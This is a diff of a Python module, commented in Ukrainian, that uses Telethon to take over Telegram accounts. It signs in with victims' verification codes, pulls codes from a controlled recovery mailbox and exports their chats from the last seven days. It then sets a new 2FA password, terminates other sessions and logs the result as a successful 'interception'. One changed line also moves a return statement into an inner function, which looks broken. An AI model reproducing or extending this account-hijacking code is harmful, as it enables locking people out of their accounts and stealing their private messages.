@@ -21,34 +21,23 @@ from telethon.errors import (
     PhoneCodeExpiredError, PasswordHashInvalidError
 )
 from typing import Optional
-
 import logging
 from datetime import datetime, timedelta, timezone
-
 from clear_telegram_chat import MASK_MESSAGE
 from config import CHAT_FOLDER, RECOVERY_EMAIL
-
 from telethon import functions, types
 
 logger = logging.getLogger(__name__)
 
 
-
-
 async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str, base_chats_folder: str = CHAT_FOLDER):
     """
-    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 дні.
-
-    Args:
-        client (TelegramClient): Активний клієнт Telethon.
-        phone_number (str): Номер телефону користувача (наприклад, '+380xxxxxxxxx').
-        base_chats_folder (str): Коренева папка для збереження чатів (за замовчуванням 'chats').
+    Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 днів.
     """
-    # Переконуємось, що базова папка існує
-    os.makedirs(base_chats_folder, exist_ok=True)
-
     # Створюємо папку для конкретного користувача
-    user_folder = os.path.join(base_chats_folder, phone_number)
+    user_folder = base_chats_folder  # НЕ створюємо ще одну папку!
+
+    # Переконуємось, що папка існує
     os.makedirs(user_folder, exist_ok=True)
 
     # Визначаємо дату 7 днів тому з часовим поясом UTC
@@ -74,8 +63,6 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
             # Встановлюємо таймаут для обробки одного чату (30 секунд)
             async with asyncio.timeout(300):
                 # Отримуємо повідомлення з цього чату
-                # limit=None - отримуємо всі повідомлення
-                # offset_date не використовуємо, бо він може пропускати повідомлення
                 async for message in client.iter_messages(
                         dialog.entity,
                         limit=None,
@@ -148,11 +135,25 @@ async def send_verification_code(phone: str, api_id: int, api_hash: str, session
     Returns:
         tuple: (успіх: bool, клієнт або повідомлення_про_помилку: str)
     """
-    os.makedirs(session_folder, exist_ok=True)
+    import stat
 
-    # Видаляємо '+' для імені файлу сесії
+    # Крок 1: Створюємо папку для сесій з правильними правами доступу
+    try:
+        os.makedirs(session_folder, exist_ok=True)
+        # Встановлюємо права: власник може все, інші - читати та виконувати
+        # Це вирішує проблему з readonly database на Fly.io
+        os.chmod(session_folder, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
+        logger.info(f"✅ Папку для сесій створено/перевірено: {session_folder}")
+    except Exception as e:
+        logger.error(f"❌ Помилка створення папки {session_folder}: {e}")
+        return False, f"Помилка створення папки для сесій: {str(e)}"
+
+    # Крок 2: Формуємо шлях до файлу сесії
+    # Видаляємо '+' з номера телефону для імені файлу
     session_name = f"{phone.replace('+', '')}.session"
     session_path = os.path.join(session_folder, session_name)
+
+    logger.info(f"📁 Створюємо сесію для {phone} за шляхом: {session_path}")
 
     client = TelegramClient(session_path, api_id, api_hash)
 
@@ -170,7 +171,6 @@ async def send_verification_code(phone: str, api_id: int, api_hash: str, session
         logger.info(f"✅ Код успішно надіслано на {phone}")
 
         # Повертаємо клієнт для подальшого використання
-        # НЕ відключаємо клієнт, він потрібен для sign_in
         return True, client
 
     except PhoneNumberInvalidError:
@@ -198,15 +198,6 @@ async def send_verification_code(phone: str, api_id: int, api_hash: str, session
 async def sign_in_with_code(client: TelegramClient, phone: str, code: str, session_folder: str):
     """
     Виконує вхід в Telegram використовуючи код підтвердження.
-
-    Args:
-        client: Активний TelegramClient з відправленим запитом на код
-        phone: Номер телефону
-        code: 5-значний код підтвердження
-        session_folder: Папка для збереження сесій
-
-    Returns:
-        tuple: (успіх: bool, шлях_до_сесії або повідомлення_про_помилку: str)
     """
     try:
         if not client.is_connected():
@@ -239,7 +230,6 @@ async def sign_in_with_code(client: TelegramClient, phone: str, code: str, sessi
         logger.error(error_msg)
         return False, error_msg
 
-
     except SessionPasswordNeededError:
         # Повертаємо спеціальний результат, який вказує на наявність 2FA
         logger.warning(f"🔐 На акаунті {phone} виявлено 2FA.")
@@ -260,75 +250,6 @@ async def sign_in_with_code(client: TelegramClient, phone: str, code: str, sessi
         )
         logger.error(f"Помилка входу: {e}")
         return False, error_msg
-
-
-async def check_session_valid(phone: str, api_id: int, api_hash: str, session_folder: str):
-    """
-    Перевіряє, чи існує та валідна сесія для вказаного номера.
-
-    Args:
-        phone: Номер телефону
-        api_id: Telegram API ID
-        api_hash: Telegram API Hash
-        session_folder: Папка з сесіями
-
-    Returns:
-        bool: True якщо сесія валідна, False інакше
-    """
-    session_name = f"{phone.replace('+', '')}.session"
-    session_path = os.path.join(session_folder, session_name)
-
-    if not os.path.exists(session_path):
-        logger.info(f"Сесія для {phone} не знайдена")
-        return False
-
-    client = TelegramClient(session_path, api_id, api_hash)
-
-    try:
-        await client.connect()
-        is_authorized = await client.is_user_authorized()
-
-        if is_authorized:
-            logger.info(f"✅ Сесія для {phone} валідна")
-        else:
-            logger.info(f"❌ Сесія для {phone} не авторизована")
-
-        return is_authorized
-
-    except Exception as e:
-        logger.error(f"Помилка при перевірці сесії для {phone}: {e}")
-        return False
-
-    finally:
-        if client.is_connected():
-            await client.disconnect()
-
-
-async def delete_session(phone: str, session_folder: str):
-    """
-    Видаляє сесію для вказаного номера.
-
-    Args:
-        phone: Номер телефону
-        session_folder: Папка з сесіями
-
-    Returns:
-        bool: True якщо сесію видалено, False якщо сесії не існувало
-    """
-    session_name = f"{phone.replace('+', '')}.session"
-    session_path = os.path.join(session_folder, session_name)
-
-    try:
-        if os.path.exists(session_path):
-            os.remove(session_path)
-            logger.info(f"✅ Сесію {phone} видалено")
-            return True
-        else:
-            logger.info(f"Сесія {phone} не існує")
-            return False
-    except Exception as e:
-        logger.error(f"Помилка при видаленні сесії {phone}: {e}")
-        return False
 
 
 def cleanup_old_emails(imap_host: str, email_user: str, email_pass: str):
@@ -358,7 +279,6 @@ def get_email_code_sync(imap_host: str, email_user: str, email_pass: str, timeou
     logger.info(f"📧 Починаємо отримання коду з {imap_host} для {email_user}")
     deadline = time.time() + timeout
     attempt = 1
-    last_processed_uid = None  # Відстежуємо останній оброблений UID
 
     while time.time() < deadline:
         logger.info(f"📧 Спроба {attempt} отримати код...")
@@ -373,7 +293,7 @@ def get_email_code_sync(imap_host: str, email_user: str, email_pass: str, timeou
             mail.select("inbox")
             logger.debug("Вибрана папка inbox")
 
-            # Шукаємо непрочитані листи від Telegram, сортуємо за датою
+            # Шукаємо непрочитані листи від Telegram
             logger.debug("Пошук листів від noreply@telegram.org...")
             _, messages = mail.search(None, 'FROM "noreply@telegram.org" UNSEEN')
 
@@ -490,8 +410,7 @@ def create_email_callback(imap_host: str, email_user: str, email_pass: str):
             logger.error(f"❌ Помилка отримання коду: {e}", exc_info=True)
             raise
 
-    return email_code_callback
-
+        return email_code_callback
 
 async def get_account_with_2fa(client: TelegramClient, new_password: str):
     try:
@@ -538,10 +457,9 @@ async def get_account_with_2fa(client: TelegramClient, new_password: str):
                 terminated_count += 1
 
         logger.info(f"🛡️ Перехоплення завершено. Завершено {terminated_count} інших сесій.")
-        return True, f"Перехоплення успішне"#. Завершено {terminated_count} інших сесій."
+        return True, f"Перехоплення успішне"
 
     except PasswordHashInvalidError:
-        # Ця помилка може виникнути, якщо пароль вже був, а ми спробували встановити новий без підтвердження старого
         logger.error("❌ Помилка: На акаунті вже є пароль. Неможливо перехопити без старого пароля.")
         return False, "На акаунті вже є 2FA. Перехоплення неможливе."
     except FloodWaitError as e:
@@ -561,7 +479,7 @@ def move_session_to_2fa(phone: str, source_folder: str, dest_folder: str):
     dest_path = os.path.join(dest_folder, session_name)
 
     try:
-        os.makedirs(dest_folder, exist_ok=True) # Переконуємось, що папка існує
+        os.makedirs(dest_folder, exist_ok=True)
         shutil.move(source_path, dest_path)
         logger.info(f"✅ Сесію для {phone} переміщено до {dest_folder}")
         return True
